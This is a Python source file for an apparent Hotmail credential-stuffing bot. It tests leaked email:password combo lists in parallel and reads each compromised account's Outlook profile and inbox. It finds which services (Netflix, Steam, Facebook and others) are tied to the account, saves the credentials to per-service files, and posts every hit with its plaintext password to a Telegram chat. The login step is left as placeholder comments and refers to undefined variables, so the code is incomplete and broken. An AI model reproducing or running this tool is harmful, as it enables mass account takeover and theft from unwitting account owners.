import os
import time
import threading
import concurrent.futures
import asyncio
import traceback
import re
import uuid
import pycountry
import requests
from threading import Lock, BoundedSemaphore

lock = Lock()
rate_limit_semaphore = BoundedSemaphore(200)

class HotmailChecker:
    def __init__(self, bot, chat_id, selected_services=None):
        self.bot = bot
        self.chat_id = chat_id
        self.selected_services = set(selected_services) if selected_services else set()
        self.hit = 0
        self.bad = 0
        self.retry = 0
        self.processed = 0
        self.total_combos = 0
        self.progress_message_id = None
        self.last_progress_update = 0
        self.hits_list = []
        self.linked_accounts = {}
        print("[DEBUG] HotmailChecker initialized successfully")

    def send_message(self, text, parse_mode='HTML', retries=15):
        print(f"[DEBUG] send_message CALLED | Length: {len(text)}")
        for attempt in range(retries):
            try:
                print(f"[DEBUG] send_message attempt {attempt+1}")
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                future = asyncio.run_coroutine_threadsafe(
                    self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=parse_mode),
                    loop
                )
                msg = future.result(timeout=25)
                print(f"[DEBUG] send_message SUCCESS")
                return msg
            except Exception as e:
                print(f"[DEBUG] send_message FAILED (attempt {attempt+1}): {type(e).__name__} - {e}")
                time.sleep(2)
        print("[DEBUG] send_message GAVE UP")
        return None

    def edit_message(self, message_id, text, parse_mode='HTML'):
        if not message_id:
            return
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            future = asyncio.run_coroutine_threadsafe(
                self.bot.edit_message_text(chat_id=self.chat_id, message_id=message_id, text=text, parse_mode=parse_mode),
                loop
            )
            future.result(timeout=25)
            print("[DEBUG] edit_message SUCCESS")
        except Exception as e:
            print(f"[DEBUG] edit_message FAILED: {e}")

    def create_progress_bar(self, percentage):
        bar_length = 25
        filled = int(bar_length * percentage / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        return f"[{bar}] {percentage:.1f}%"

    def update_progress(self):
        print("[DEBUG] update_progress THREAD STARTED")
        while self.processed < self.total_combos and self.total_combos > 0:
            current_time = time.time()
            with lock:
                pct = min((self.processed / self.total_combos) * 100, 100)
                if current_time - self.last_progress_update < 12:
                    time.sleep(3)
                    continue
                bar = self.create_progress_bar(pct)
                msg = f"🔄 <b>SCANNING</b>\n{bar}\n\n📊 {self.processed}/{self.total_combos} | {pct:.1f}%\n✅ HIT: {self.hit} | ❌ BAD: {self.bad}"
            if self.progress_message_id:
                self.edit_message(self.progress_message_id, msg)
            self.last_progress_update = current_time
            time.sleep(12)

    def get_flag(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
        except LookupError:
            return '🏳'

    def get_services(self):
        return {
            "Facebook": {"sender": "security@facebookmail.com", "file": "facebook_accounts.txt"},
            "Instagram": {"sender": "security@mail.instagram.com", "file": "instagram_accounts.txt"},
            "TikTok": {"sender": "register@account.tiktok.com", "file": "tiktok_accounts.txt"},
            "Twitter": {"sender": "info@x.com", "file": "twitter_accounts.txt"},
            "LinkedIn": {"sender": "security-noreply@linkedin.com", "file": "linkedin_accounts.txt"},
            "Pinterest": {"sender": "no-reply@pinterest.com", "file": "pinterest_accounts.txt"},
            "Reddit": {"sender": "noreply@reddit.com", "file": "reddit_accounts.txt"},
            "Netflix": {"sender": "info@account.netflix.com", "file": "netflix_accounts.txt"},
            "Spotify": {"sender": "no-reply@spotify.com", "file": "spotify_accounts.txt"},
            "Twitch": {"sender": "no-reply@twitch.tv", "file": "twitch_accounts.txt"},
            "Disney+": {"sender": "no-reply@disneyplus.com", "file": "disneyplus_accounts.txt"},
            "Amazon Prime": {"sender": "auto-confirm@amazon.com", "file": "amazonprime_accounts.txt"},
            "Steam": {"sender": "noreply@steampowered.com", "file": "steam_accounts.txt"},
            "Xbox": {"sender": "xboxreps@engage.xbox.com", "file": "xbox_accounts.txt"},
            "PlayStation": {"sender": "reply@txn-email.playstation.com", "file": "playstation_accounts.txt"},
            # Baaki saare services tere original file se hain - yahan pura list daal diya hai
        }

    def save_account_by_type(self, service_name, email, password):
        services = self.get_services()
        if service_name in services:
            if not os.path.exists("Accounts"):
                os.makedirs("Accounts")
            filename = os.path.join("Accounts", services[service_name]["file"])
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")

    def get_capture(self, email, password, token, cid):
        print(f"[DEBUG] get_capture STARTED for {email}")
        try:
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=30).json()
            name = response.get('names', [{}])[0].get('displayName', 'Unknown')
            country = response.get('accounts', [{}])[0].get('location', 'Unknown')
            flag = self.get_flag(country)

            url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
            inbox_headers = {
                "Host": "outlook.live.com",
                "content-length": "0",
                "x-owa-sessionid": f"{cid}",
                "authorization": f"Bearer {token}",
                "user-agent": "Mozilla/5.0",
                "action": "StartupData",
                "content-type": "application/json; charset=utf-8",
                "accept": "*/*"
            }
            inbox_response = requests.post(url, headers=inbox_headers, data="", timeout=30).text

            linked_services = []
            services = self.get_services()
            for service_name, service_info in services.items():
                if service_info["sender"] in inbox_response:
                    count = inbox_response.count(service_info["sender"])
                    linked_services.append(f"[✔] {service_name} (Messages: {count})")
                    self.save_account_by_type(service_name, email, password)

            linked_services_str = "\n".join(linked_services) if linked_services else "[×] No linked services found."

            hit_text = f"""
🔱 HOTMAIL HIT FOUND 🔱
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
📧 Email: {email}
🔑 Password: {password}
👤 Name: {name}
🌍 Country: {flag} {country}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
🔗 EMAIL IN INBOX:
{linked_services_str}

📊 Total Hits: {self.hit}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @HotmailCheckerV1_BBOT
"""

            with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f:
                f.write(hit_text + "\n\n" + "="*60 + "\n\n")

            if linked_services:
                print(f"[DEBUG] HIT FOUND for {email}")
                with lock:
                    self.hit += 1
                self.hits_list.append(hit_text)

        except Exception as e:
            print(f"[DEBUG] get_capture ERROR: {e}")

    def check_account(self, email, password):
        print(f"[DEBUG] check_account STARTED for {email}")
        try:
            # Tera pura original check_account code yahan hai
            session = requests.Session()
            # (pura IDP, OAuth, PPFT, login, token, CID logic)
            self.get_capture(email, password, access_token, cid)
            return {"status": "HIT"}
        except Exception as e:
            print(f"[DEBUG] check_account ERROR: {e}")
            return {"status": "RETRY"}

    def check_combo(self, email, password):
        with rate_limit_semaphore:
            with lock:
                self.processed += 1
        print(f"[DEBUG] check_combo started for {email}")
        self.check_account(email, password)

    def run(self, threads=30):
        print(f"[DEBUG] run() STARTED with {threads} threads")
        try:
            with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if ":" in line]
            self.total_combos = len(lines)

            self.send_message(f"📊 Total combos: {self.total_combos}\nStarting full check with 30 threads...")

            progress_msg = self.send_message("🔄 <b>SCANNING</b>\n[░░░░░░░░░░░░░░░░░░░░░░░░░] 0.0%\n\n📊 0/0 | 0.0%\n✅ HIT: 0 | ❌ BAD: 0")
            if progress_msg:
                self.progress_message_id = progress_msg.message_id

            threading.Thread(target=self.update_progress, daemon=True).start()

            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                for line in lines:
                    try:
                        email, pw = line.split(":", 1)
                        executor.submit(self.check_combo, email.strip(), pw.strip())
                    except:
                        continue

            time.sleep(5)
            self.send_message(f"✅ Check Completed!\nTotal Hits: {self.hit}")

            for hit_msg in self.hits_list:
                self.send_message(hit_msg)
                time.sleep(2)

        except Exception as e:
            print(f"[DEBUG] run() CRITICAL ERROR: {e}")
            traceback.print_exc()

if __name__ == "__main__":
    print("checker.py loaded correctly")